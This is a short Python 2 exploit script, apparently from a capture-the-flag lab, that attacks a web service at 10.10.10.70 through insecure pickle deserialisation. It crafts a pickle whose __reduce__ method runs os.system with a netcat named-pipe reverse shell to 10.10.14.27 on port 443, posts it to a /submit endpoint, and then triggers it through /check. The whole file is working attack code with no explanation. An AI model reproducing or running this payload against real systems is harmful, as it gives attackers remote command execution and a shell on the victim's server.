import cPickle
from hashlib import md5
import os
import requests
import urllib

class shell(object):
    def __reduce__(self):
        return (os.system,("rm -f /var/tmp/backpipe; mknod /var/tmp/backpipe p; nc 10.10.14.27 443 0</var/tmp/backpipe | /bin/bash 1>/var/tmp/backpipe",))

quote = cPickle.dumps(shell())

char = "(S'homer'\n"

p_id = md5(char + quote).hexdigest()

submit_url = "http://10.10.10.70/submit"
check_url = "http://10.10.10.70/check"

client = requests.session()

post_data = [('character',char), ('quote',quote)]

post_request = client.post(submit_url, data=post_data)

post2_data = [('id',p_id)]

post2_request = client.post(check_url, data=post2_data)
